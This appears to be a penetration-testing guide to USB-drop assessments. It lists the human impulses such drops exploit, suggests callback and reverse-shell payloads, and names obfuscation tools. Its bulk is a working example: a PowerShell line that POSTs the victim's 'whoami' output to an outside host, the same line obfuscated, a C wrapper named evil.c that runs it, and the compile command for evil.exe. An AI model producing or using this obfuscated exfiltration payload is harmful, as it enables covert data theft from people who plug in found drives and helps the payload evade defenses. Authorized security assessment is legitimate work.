# Facts about USB dropping

- The attack relies on the following human-nature factors:
	- [ ] the desire to be helpful: *"I want to find who is the owner of this device"*
	- [ ] curiosity: *"these files seem confidential, let me take a look"*
	- [ ] advantage-seeking: *"this usb has spotify-premium installed, I'll use it!"*

- The attack is more effective in the following conditions
	- [ ] there are house keys attached to the usb
	- [ ] there is a "confidential" label on it

# Determine the goal of the assessment

Most USB dropping assessment has the goal of obtain a PoC that a user in fact picked it up and opened one of its files. Here are few ideas of files that help you obtain proof.

- [ ] An html file that pings to a dns server controlled by you
- [ ] A .exe file that will ping to a http server controlled by you and sends information about the computer compromised
- [ ] A reverse shell (test obfuscation first)
- [ ] A pdf file that will ping a host controlled by you

# Obufscation

Without going in much detail, there are two tools you can research about and use:
- [Invoke-PSObfuscation](https://github.com/gh0x0st/Invoke-PSObfuscation)
- [Veil](https://github.com/Veil-Framework/Veil)

Check the pages above for usage guides. I will demonstrate use cases below.

# Example

**Executable that sends a POST request with sensitive information to attacker-controlled website**

1. **Raw PS1 instructions**

```powershell
$w=[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes((whoami)));$b=@{whoami=$w};$a=Invoke-WebRequest -Method POST -Uri "https://ce71n3c2vtc0000afs80g8do4tayyyyyb.oast.fun" -Body $b
```

2. **Obfuscated PS1 instructions**

```bash
┌──(kali㉿kali)-[~]
└─$ pwsh 
PowerShell 7.1.3
Copyright (c) Microsoft Corporation.

https://aka.ms/powershell
Type 'help' to get help.
Invoke-PSObfuscation -Path .\raw.ps1 -All -OutFile ./obsfucated.ps1                    

     >> Layer 0 Obfuscation
     >> https://github.com/gh0x0st

[*] Resolving aliases
[*] Obfuscating integers
[*] Obfuscating strings
[*] Obfuscating namespace classes
[*] Obfuscating cmdlets
[*] Obfuscating pipes
[*] Obfuscating pipeline variables
[*] Obfuscating variables
[*] Obfuscating method invocations
[*] Removing comments
[*] Writing payload to ./obfuscated.ps1
[*] Done

┌──(kali㉿kali)-[~]
└─$ cat obfuscated.ps1  

$jcfvr8zuTIwk3QANbUVM=[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes((whoami)));$aqmswCc8ZbIDMtLTYA3PBeg=@{whoami=$jcfvr8zuTIwk3QANbUVM};$2PlsaxDpMEer1h=& (('dcksZTyNnfh0v43pS9wWVKGtCzeRHPxbAqQa6lIUY58D-omuMXE7JigFOrL2j1B')[38,8,12,45,2,26,44,19,26,31,27,26,33,47,26,3,23] -join '') -Method POST -Uri $([char](9*104/9)+[char](0+116-0)+[char](28+116-28)+[char](66+112-66)+[char](0+115-0)+[char](33+58-33)+[char](0+47-0)+[char](64+47-64)+[char](24*99/24)+[char](0+101-0)+[char](0+55-0)+[char](0+49-0)+[char](0+110-0)+[char](0+51-0)+[char](73*99/73)+[char](0+50-0)+[char](3*118/3)+[char](118*116/118)+[char](109+99-109)+[char](0+48-0)+[char](16+48-16)+[char](69+48-69)+[char](68*48/68)+[char](97*97/97)+[char](101*102/101)+[char](0+115-0)+[char](52*56/52)+[char](42*48/42)+[char](19*103/19)+[char](0+56-0)+[char](53+100-53)+[char](0+111-0)+[char](30*52/30)+[char](0+116-0)+[char](94+97-94)+[char](100*121/100)+[char](35*121/35)+[char](17+121-17)+[char](46*121/46)+[char](0+121-0)+[char](0+98-0)+[char](0+46-0)+[char](0+111-0)+[char](0+97-0)+[char](0+115-0)+[char](0+116-0)+[char](0+46-0)+[char](72+102-72)+[char](87+117-87)+[char](15+110-15)) -Body $aqmswCc8ZbIDMtLTYA3PBeg
```

3. **C file**

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MAX_LENGTH 10000

int main()
{
    char cmd[MAX_LENGTH];
    strcpy(cmd, "powershell.exe");
    strcat(cmd, " -Command \"$jcfvr8zuTIwk3QANbUVM=[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes((whoami)));$aqmswCc8ZbIDMtLTYA3PBeg=@{whoami=$jcfvr8zuTIwk3QANbUVM};$2PlsaxDpMEer1h=& (('dcksZTyNnfh0v43pS9wWVKGtCzeRHPxbAqQa6lIUY58D-omuMXE7JigFOrL2j1B')[38,8,12,45,2,26,44,19,26,31,27,26,33,47,26,3,23] -join '') -Method POST -Uri $([char](9*104/9)+[char](0+116-0)+[char](28+116-28)+[char](66+112-66)+[char](0+115-0)+[char](33+58-33)+[char](0+47-0)+[char](64+47-64)+[char](24*99/24)+[char](0+101-0)+[char](0+55-0)+[char](0+49-0)+[char](0+110-0)+[char](0+51-0)+[char](73*99/73)+[char](0+50-0)+[char](3*118/3)+[char](118*116/118)+[char](109+99-109)+[char](0+48-0)+[char](16+48-16)+[char](69+48-69)+[char](68*48/68)+[char](97*97/97)+[char](101*102/101)+[char](0+115-0)+[char](52*56/52)+[char](42*48/42)+[char](19*103/19)+[char](0+56-0)+[char](53+100-53)+[char](0+111-0)+[char](30*52/30)+[char](0+116-0)+[char](94+97-94)+[char](100*121/100)+[char](35*121/35)+[char](17+121-17)+[char](46*121/46)+[char](0+121-0)+[char](0+98-0)+[char](0+46-0)+[char](0+111-0)+[char](0+97-0)+[char](0+115-0)+[char](0+116-0)+[char](0+46-0)+[char](72+102-72)+[char](87+117-87)+[char](15+110-15)) -Body $aqmswCc8ZbIDMtLTYA3PBeg\"");
    system(cmd);
    return 0;

	// saved as evil.c
}
```

4. **Compilation**

```bash
┌──(kali㉿kali)-[~]
└─$ i686-w64-mingw32-gcc -o evil.exe evil.c
```